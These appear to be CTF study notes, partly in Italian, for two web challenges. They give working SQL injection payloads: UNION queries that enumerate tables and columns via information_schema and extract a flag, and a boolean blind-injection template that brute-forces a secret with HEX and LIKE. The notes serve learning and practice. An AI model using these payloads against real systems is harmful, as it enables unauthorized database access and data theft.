# web 18

ottenere tutte le tabelle:
```sql
' UNION SELECT table_name,table_schema,3,4,5,6 FROM information_schema.tables -- -1
```

ottenere le colonne di una tabella:
```sql
' UNION SELECT column_name,table_name,3,4,5,6 FROM information_schema.columns WHERE table_name='real_data' -- -1
```

ottieni la flag
```sql
' UNION SELECT flag,2,3,4,5,6 FROM real_data -- -
```

# web 19 blind

**template per blind**:
```sql
1' AND (SELECT 1 WHERE 1=1)='1
```

```sql
1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '0%')='1
```

**SQL LIKE**: is used to search in a `WHERE` for matching pattern.
* `%`: zero, one or multiple characters
* `_`: a single character

```sql
SELECT * FROM Customers WHERE CustomerName LIKE 'a%';
```
* Select Customers with CustomerName starting with `a`.

**come fare una blind**?
* l'unica cosa che possiamo fare e' chiedere cosa contiene il valore che stiamo cercando
* e quindi effettuare il bruteforce tramite script automatizzati

**es**:
```sql
1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '0%')='1

SELECT * FROM main WHERE id='1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '0%')='1'
```
